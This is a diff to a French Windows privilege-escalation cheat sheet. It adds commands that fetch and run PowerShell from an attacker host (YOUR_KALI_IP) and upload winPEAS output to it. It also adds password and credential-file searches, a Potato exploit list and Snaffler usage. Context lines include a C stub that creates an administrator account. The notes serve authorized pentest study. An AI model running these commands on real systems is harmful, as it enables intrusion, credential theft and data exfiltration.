@@ -2,16 +2,6 @@
 
 ## Commandes utiles
 
-**Trouver un flag**
-
-```powershell
-Get-ChildItem -Path C:\ -Filter "flag.txt" -Recurse -Force -ErrorAction SilentlyContinue
-```
-
-```
-dir /s /b /a C:\flag.txt
-```
-
 **ExecutionPolicy**
 
 ```powershell
@@ -114,10 +104,16 @@ Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.d
 
 Get-ChildItem -Path C:\Users\ -Include *.ini -File -Recurse -ErrorAction SilentlyContinue
 
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" 2>$null
+
 # CMD
-dir /s /b /a C:\*.txt
+dir /s /b /a C:\*.txt 2>nul
 
 dir /s /b /a C:\*.kdbx 2>nul
+
+dir /s /b /a C:\*.settings 2>nul
+
+dir /s /b /a C:\Users\*.ini 2>nul
 ```
 
 **Lire un fichier**
@@ -193,7 +189,57 @@ Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object 
 
 ### Enumération automatique
 
-**winPEAS**
+#### PrivescCheck
+https://github.com/itm4n/PrivescCheck
+
+```bash
+wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
+
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report <PREFIX> -Format HTML"
+```
+
+#### ParsingPeas
+https://github.com/YuvalMil/ParsingPeas
+
+**On Kali Host**
+
+```shell
+git clone https://github.com/YuvalMil/ParsingPeas.git
+cd ParsingPeas
+./setup.sh              # Downloads LinPEAS/WinPEAS
+pip3 install -r requirements.txt
+python3 receiver.py     # Starts on http://0.0.0.0:8000
+```
+
+**On Target Machine**
+
+```powershell
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/wrapper-inline.ps1')"
+```
+
+Navigate to `http://YOUR_KALI_IP:8000` in your browser to view reports.
+
+If the one-liner fails:
+```powershell
+# On target (PowerShell)
+Invoke-WebRequest -Uri http://KALI_IP:8000/get-winpeas -OutFile $env:TEMP\wp.exe
+& "$env:TEMP\wp.exe" > $env:TEMP\out.txt
+
+# Transfer
+$hostname = $env:COMPUTERNAME
+Invoke-WebRequest -Uri http://KALI_IP:8000/upload `
+  -Method POST `
+  -Headers @{"X-Hostname"=$hostname; "X-Scan-Type"="winpeas"} `
+  -InFile $env:TEMP\out.txt
+```
+
+**Parse local files:**
+
+```shell
+python3 parser.py /path/to/peas_output.txt
+```
+
+#### winPEAS
 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 
 Peut être bloqué par l'AV. Alternatives : Seatbelt, JAWS. Ne remplace pas l'énumération manuelle (peut rater des fichiers, mal identifier l'OS, etc.).
@@ -225,7 +271,7 @@ iwr -uri http://<ip>/winPEASx64.exe -Outfile winPEAS.exe
 .\winpeas.exe | Tee-Object -FilePath output.txt
 ```
 
-**Seatbelt**
+#### Seatbelt
 https://github.com/GhostPack/Seatbelt.git
 
 Compiler sur une machine Windows avec VS Build Tools, transférer le binaire sur la cible.
@@ -296,7 +342,7 @@ Si pas les droits sur le binaire vérifier les droits sur le folder, si droits `
 #include <stdlib.h>
 int main() {
   system("net user johndoe Password123! /add");
-  system("net localgroup administrators john /add");
+  system("net localgroup administrators johndoe /add");
   return 0;
 }
 ```
@@ -656,14 +702,15 @@ Principe : forcer un processus SYSTEM à s'authentifier sur un named pipe contr�
 
 Prérequis : `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.
 
-| Outil | Notes |
-|-------|-------|
-| [RottenPotato](https://github.com/breenmachine/RottenPotatoNG) | Le premier, exploite DCOM + NTLM relay local. Obsolète, patché. |
-| [JuicyPotato](https://github.com/ohpe/juicy-potato) | Amélioration de Rotten, choix du CLSID DCOM. Patché sur Windows 10 1809+ / Server 2019+. |
-| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | Exploite le Spooler via named pipe, fonctionne là où JuicyPotato échoue. |
-| [SweetPotato](https://github.com/CCob/SweetPotato) | Combine JuicyPotato + PrintSpoofer, plus polyvalent. |
-| [GodPotato](https://github.com/BeichenDream/GodPotato) | Exploite IRemUnknown2 via DCOM, fonctionne sur Windows 2012-2022. Le plus fiable actuellement. |
-| [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) | Variante moderne, simple d'utilisation. |
+| Outil                                                                                              | Notes                                                                                          |
+| -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
+| [RottenPotato](https://github.com/breenmachine/RottenPotatoNG)                                     | Le premier, exploite DCOM + NTLM relay local. Obsolète, patché.                                |
+| [JuicyPotato](https://github.com/ohpe/juicy-potato)                                                | Amélioration de Rotten, choix du CLSID DCOM. Patché sur Windows 10 1809+ / Server 2019+.       |
+| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)                                              | Exploite le Spooler via named pipe, fonctionne là où JuicyPotato échoue.                       |
+| [SweetPotato](https://github.com/CCob/SweetPotato)                                                 | Combine JuicyPotato + PrintSpoofer, plus polyvalent.                                           |
+| [GodPotato](https://github.com/BeichenDream/GodPotato)                                             | Exploite IRemUnknown2 via DCOM, fonctionne sur Windows 2012-2022. Le plus fiable actuellement. |
+| [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) | Variante moderne, simple d'utilisation.                                                        |
+| [PetitPotato](https://github.com/wh0amitz/PetitPotato)                                             | + Moderne                                                                                      |
 
 Choix rapide : GodPotato en premier, PrintSpoofer en fallback.
 
@@ -708,3 +755,14 @@ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
 
 ### LOLBAS
 [LOLBAS](https://lolbas-project.github.io)
+
+## Snaffler
+
+https://github.com/SnaffCon/Snaffler
+https://github.com/zh54321/SnafflerParser
+
+```bash
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe
+.\Snaffler.exe -o snafflerout.txt -s -y
+.\snafflerparser.ps1 -in my_snaffler_output.txt
+```
